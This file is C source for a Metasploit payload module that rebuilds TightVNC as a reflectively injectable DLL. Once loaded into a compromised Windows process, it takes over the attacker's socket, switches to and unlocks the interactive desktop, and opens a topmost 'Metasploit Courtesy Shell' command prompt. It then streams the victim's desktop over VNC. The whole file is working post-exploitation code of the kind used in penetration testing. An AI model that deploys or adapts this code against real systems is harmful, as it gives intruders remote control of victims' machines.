/*
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * March 2010: TightVNC 1.3.10 source modified as standalone x86/x64 DLL.
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * Tested On x86 Windows: - NT4, 2000, XP, 2003, Vista, 2008, 7
 * Tested On x64 Windows: - 2003, 2008R2, 7
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * Note: Session 0 isolation on Vista and above will prevent accessing the
 * input desktop from another session (e.g. 1) if the DLL is used from a 
 * service.
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */

#include "stdhdrs.h"
#include "VSocket.h"
#include "vncServer.h"

#define VNCDLL_FLAG_DISABLE_SHELL (1 << 0)

/*
 * Use Reflective DLL Injection.
 */
#include "../../meterpreter/source/ReflectiveDLLInjection/ReflectiveLoader.c"

/*
 * The termination event set by the client closing the connection.
 */
HANDLE hTerminateEvent = NULL;

/*
 * Switch to the input desktop and set it as this threads desktop.
 */
HDESK get_input_desktop( VOID )
{
	HWINSTA ws = NULL;
	HWINSTA os = NULL;
	HDESK ds = NULL;

	os = GetProcessWindowStation();
	ws = OpenWindowStation( "WinSta0", TRUE, MAXIMUM_ALLOWED );
	if( ws == NULL )
	{
		RevertToSelf();
		ws = OpenWindowStation( "WinSta0", TRUE, MAXIMUM_ALLOWED );
	}

	if( ws != NULL )
	{
		if( !SetProcessWindowStation( ws ) )
			ws = NULL;
		else
			CloseWindowStation( os );
	}

	ds = OpenInputDesktop( NULL, TRUE, MAXIMUM_ALLOWED );
	if( ws && ds == NULL )
		CloseHandle( ws );

	if( ds && ! SwitchDesktop( ds ) )
	{
		CloseHandle( ws );
		CloseHandle( ds );
	}

	SetThreadDesktop( ds );

	return ds;
}

/*
 * Entry Point.
 */
DWORD Init( SOCKET socket )
{
	VSocketSystem * socksys = NULL;
	vncServer * server      = NULL;
	VSocket * sock          = NULL;
	HMODULE hUser32         = NULL;
	HDESK desk              = NULL;
	BYTE bFlags             = 0;

	hTerminateEvent = CreateEvent( NULL, TRUE, FALSE, NULL );

	recv( socket, (PCHAR)&bFlags, 1, 0 );

	desk = get_input_desktop();
		
	hUser32 = LoadLibrary( "user32.dll" );
	if( hUser32 )
	{
		typedef BOOL (WINAPI * UNLOCKWINDOWSTATION)( HWINSTA );
		UNLOCKWINDOWSTATION pUnlockWindowStation = (UNLOCKWINDOWSTATION)GetProcAddress( hUser32, "UnlockWindowStation" );
		if( pUnlockWindowStation )
			pUnlockWindowStation( GetProcessWindowStation() );

		FreeLibrary( hUser32 );
	}

	if( ( bFlags & VNCDLL_FLAG_DISABLE_SHELL) == 0 )
	{
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		char name_win[256];
		char name_des[256];
		char name_all[1024];

		memset(name_all, 0, sizeof(name_all));

		GetUserObjectInformation( GetProcessWindowStation(), UOI_NAME, &name_win, 256, NULL );
		GetUserObjectInformation( desk, UOI_NAME, &name_des, 256, NULL );

		_snprintf(name_all, sizeof(name_all)-1, "%s\\%s", name_win, name_des);

		memset(&pi, 0, sizeof(pi));
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USEFILLATTRIBUTE;
		si.wShowWindow = SW_NORMAL;
		si.lpDesktop = name_all;
		si.lpTitle = "Metasploit Courtesy Shell (TM)";
		si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;
	
		CreateProcess(NULL, "cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		
		Sleep(1000);
	
		HWND shell = FindWindow( NULL, "Metasploit Courtesy Shell (TM)" );
		if( shell )
			SetWindowPos( shell, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE );
	}

	SetProcessShutdownParameters( 0x100, 0 );

	socksys = new VSocketSystem();
	if( !socksys->Initialised() )
		return 0;

	server = new vncServer();

	sock = new VSocket( socket );

	server->AddClient( sock, FALSE, FALSE );

	WaitForSingleObjectEx( hTerminateEvent, INFINITE, FALSE );

	delete server;

	delete socksys;

	return 0;
}
